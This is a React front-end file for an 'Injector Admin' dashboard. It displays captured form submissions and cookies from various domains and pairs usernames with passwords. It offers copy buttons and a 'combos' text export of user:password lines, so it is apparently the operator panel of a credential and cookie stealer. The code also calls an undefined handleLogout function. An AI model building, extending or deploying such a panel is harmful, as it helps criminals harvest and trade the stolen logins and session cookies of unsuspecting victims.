import React, { useState, useEffect } from 'react'
import Login from './Login'
import './App.css'

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [token, setToken] = useState('')
  const [activeTab, setActiveTab] = useState('captures')
  const [captures, setCaptures] = useState([])
  const [credentials, setCredentials] = useState([])
  const [accounts, setAccounts] = useState([])
  const [loading, setLoading] = useState(false)
  const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0, total_accounts: 0 })
  const [error, setError] = useState(null)
  const [searchTerm, setSearchTerm] = useState('')
  const [typeFilter, setTypeFilter] = useState('ALL')
  const [debouncedSearch, setDebouncedSearch] = useState('')
  const [selectedIds, setSelectedIds] = useState([])

  // Use relative path for universal support (local & production)
  const API_BASE = '/v1/admin'

  useEffect(() => {
    const savedToken = localStorage.getItem('admin_api_key')
    if (savedToken) {
      setToken(savedToken)
      setIsAuthenticated(true)
    }
  }, [])

  // Debounce search term
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(searchTerm)
    }, 500)
    return () => clearTimeout(timer)
  }, [searchTerm])

  useEffect(() => {
    if (isAuthenticated) {
      fetchData()
    }
  }, [activeTab, isAuthenticated, typeFilter, debouncedSearch])

  const fetchData = async () => {
    setLoading(true)
    setError(null)
    try {
      let endpoint = ''
      if (activeTab === 'captures') endpoint = '/captures'
      else if (activeTab === 'credentials') endpoint = '/credentials'
      else if (activeTab === 'accounts') endpoint = '/accounts'

      const queryParams = new URLSearchParams({
        capture_type: typeFilter,
        search: debouncedSearch
      })

      const res = await fetch(`${API_BASE}${endpoint}?${queryParams}`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      })

      if (res.status === 401) {
        handleLogout()
        return
      }

      if (!res.ok) {
        throw new Error(`Server returned ${res.status}: ${res.statusText}`)
      }

      const json = await res.json()

      if (activeTab === 'captures') {
        setCaptures(json.data || [])
        setStats(prev => ({ ...prev, total_captures: json.total || 0 }))
      } else if (activeTab === 'credentials') {
        setCredentials(json.data || [])
        setStats(prev => ({ ...prev, total_credentials: json.total || 0 }))
      } else if (activeTab === 'accounts') {
        setAccounts(json.data || [])
        setStats(prev => ({ ...prev, total_accounts: json.total || 0 }))
      }
      setSelectedIds([]) // Reset selection on new data
    } catch (err) {
      console.error('Fetch error:', err)
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  const handleSelectAll = (e) => {
    if (e.target.checked) {
      const allIds = captures.map(c => c.id)
      setSelectedIds(allIds)
    } else {
      setSelectedIds([])
    }
  }

  const handleSelectOne = (id) => {
    setSelectedIds(prev =>
      prev.includes(id) ? prev.filter(i => i !== id) : [...prev, id]
    )
  }

  const handleBulkDelete = async () => {
    if (!window.confirm(`Delete ${selectedIds.length} selected captures?`)) return
    setLoading(true)
    try {
      const res = await fetch(`${API_BASE}/captures/bulk-delete`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ ids: selectedIds })
      })
      if (res.status === 401) handleLogout()
      else fetchData()
    } catch (err) {
      alert('Bulk delete failed')
    } finally {
      setLoading(false)
    }
  }

  const handleDelete = async (id) => {
    if (!window.confirm('Delete this capture?')) return
    try {
      const res = await fetch(`${API_BASE}/captures/${id}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      })
      if (res.status === 401) handleLogout()
      else fetchData()
    } catch (err) {
      alert('Delete failed')
    }
  }

  const handleLogin = (key) => {
    setToken(key)
    setIsAuthenticated(true)
  }

  const handlePurgeData = async () => {
    const confirmKey = window.prompt('CRITICAL: This will PERMANENTLY delete ALL database records. Please enter your ADMIN API KEY to confirm:')
    if (!confirmKey) return

    if (confirmKey !== token) {
      alert('Verification Failed: Invalid API Key.')
      return
    }

    if (!window.confirm('FINAL WARNING: Are you absolutely sure you want to nuke the entire database? This cannot be undone.')) return

    setLoading(true)
    try {
      const res = await fetch(`/v1/admin/purge`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      })
      if (res.status === 401) handleLogout()
      else fetchData()
      alert('Database purged successfully.')
    } catch (err) {
      alert('Purge operation failed')
    } finally {
      setLoading(false)
    }
  }

  const handleExportAccounts = () => {
    if (accounts.length === 0) return
    const comboList = accounts.map(acc => `${acc.user}:${acc.password}`).join('\n')
    const blob = new Blob([comboList], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `combos_${new Date().toISOString().split('T')[0]}.txt`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  if (!isAuthenticated) {
    return <Login onLogin={handleLogin} />
  }

  return (
    <div className="layout">
      <aside className="sidebar glass">
        <div className="logo">
          <div className="logo-icon">NI</div>
          <span>Injector Admin</span>
        </div>
        <nav>
          <button
            className={activeTab === 'captures' ? 'active' : ''}
            onClick={() => setActiveTab('captures')}
          >
            Audit Captures
          </button>
          <button
            className={activeTab === 'credentials' ? 'active' : ''}
            onClick={() => setActiveTab('credentials')}
          >
            Extracted Data
          </button>
          <button
            className={activeTab === 'accounts' ? 'active' : ''}
            onClick={() => setActiveTab('accounts')}
          >
            Smart Accounts
          </button>
        </nav>
        <div className="sidebar-stats">
          <div className="stat-item">
            <label>Captures</label>
            <span>{stats.total_captures}</span>
          </div>
          <div className="stat-item">
            <label>Credentials</label>
            <span>{stats.total_credentials}</span>
          </div>
          <div className="stat-item">
            <label>Accounts</label>
            <span>{stats.total_accounts}</span>
          </div>
          <button className="purge-btn" onClick={handlePurgeData}>Purge All Data</button>
          <button className="logout-btn" onClick={handleLogout}>Disconnect Node</button>
        </div>
      </aside>

      <main className="content">
        <header className="content-header">
          <h1>
            {activeTab === 'captures' ? 'Audit Logs' :
              activeTab === 'credentials' ? 'Credential Extraction' :
                'Smart Account Correlation'}
          </h1>
          <div className="header-actions">
            {activeTab === 'accounts' && (
              <button className="export-btn" onClick={handleExportAccounts}>📥 Export .txt</button>
            )}
            <button className="refresh-btn" onClick={fetchData}>Refresh</button>
          </div>
        </header>

        <section className="filter-bar glass">
          <div className="search-box">
            <input
              type="text"
              placeholder="Search domain or URL..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <div className="type-filter">
            <select value={typeFilter} onChange={(e) => setTypeFilter(e.target.value)}>
              <option value="ALL">All Events</option>
              <option value="FORM_SUBMIT">Credentials</option>
              <option value="HTTP_REQUEST">Network Requests</option>
              <option value="HEADER_CAPTURE">Passive Cookies</option>
              <option value="G100">Cookie Snapshots</option>
            </select>
          </div>
        </section>

        {selectedIds.length > 0 && activeTab === 'captures' && (
          <div className="bulk-actions animate-fade">
            <span className="selection-info">{selectedIds.length} items selected</span>
            <button className="bulk-delete-btn" onClick={handleBulkDelete}>
              Delete Selected
            </button>
          </div>
        )}

        {error && (
          <div className="error-banner animate-fade">
            ⚠️ <strong>Error:</strong> {error}
          </div>
        )}

        {loading ? (
          <div className="loader">Synchronizing with Node...</div>
        ) : (
          <div className="data-view animate-fade">
            {activeTab === 'captures' ? (
              <table className="admin-table">
                <thead>
                  <tr>
                    <th width="40">
                      <input
                        type="checkbox"
                        onChange={handleSelectAll}
                        checked={selectedIds.length === captures.length && captures.length > 0}
                      />
                    </th>
                    <th>Time</th>
                    <th>Type</th>
                    <th>Domain</th>
                    <th>URL</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {captures.map(c => (
                    <tr key={c.id} className={selectedIds.includes(c.id) ? 'row-selected' : ''}>
                      <td>
                        <input
                          type="checkbox"
                          checked={selectedIds.includes(c.id)}
                          onChange={() => handleSelectOne(c.id)}
                        />
                      </td>
                      <td className="dim">{new Date(c.timestamp).toLocaleString()}</td>
                      <td>
                        <span className={`badge ${c.capture_type}`}>{c.capture_type}</span>
                        {c.capture_type === 'G100' && c.metadata?.node_count && (
                          <span className="count-badge">+{c.metadata.node_count} nodes</span>
                        )}
                      </td>
                      <td className="bold">{c.domain}</td>
                      <td className="dim truncate">{c.url}</td>
                      <td>
                        <button className="delete-btn" onClick={() => handleDelete(c.id)}>Delete</button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : activeTab === 'credentials' ? (
              <div className="creds-grid">
                {credentials.map(cr => (
                  <div key={cr.id} className="cred-card glass">
                    <div className="cred-header">
                      <span className="cred-domain">{cr.domain}</span>
                      <span className="cred-time">{new Date(cr.timestamp).toLocaleDateString()}</span>
                    </div>
                    <div className="cred-body">
                      <div className="field">
                        <label>{cr.field_name}</label>
                        <div className="value">{cr.field_value}</div>
                      </div>
                    </div>
                    <div className="cred-footer">
                      <span className="cred-type">{cr.capture_type}</span>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div className="accounts-grid">
                {accounts.map(acc => (
                  <div key={acc.capture_id} className={`account-card glass animate-fade ${acc.is_high_confidence ? 'high-confidence' : ''}`}>
                    <div className="account-header">
                      <div className="domain-stack">
                        <span className="account-domain">{acc.domain}</span>
                        {acc.is_high_confidence && <span className="conf-badge">Verified Pair</span>}
                      </div>
                      <div className="account-meta">
                        <span className="capture-count">Captured {acc.capture_count}x</span>
                        <span className="account-time">Last: {new Date(acc.last_seen).toLocaleDateString()}</span>
                      </div>
                    </div>
                    <div className="account-combo">
                      <div className="combo-strip">
                        <span className="combo-user">{acc.user}</span>
                        <span className="combo-sep">:</span>
                        <span className="combo-pass">{acc.password}</span>
                      </div>
                      <button
                        className="copy-combo-btn"
                        onClick={() => {
                          navigator.clipboard.writeText(`${acc.user}:${acc.password}`)
                          alert('Combo copied to clipboard!')
                        }}
                      >
                        📋 Copy
                      </button>
                    </div>
                    <div className="account-details">
                      {Object.entries(acc.all_fields).map(([k, v]) => (
                        <div key={k} className="detail-row">
                          <label>{k}:</label>
                          <span>{v}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  )
}

export default App
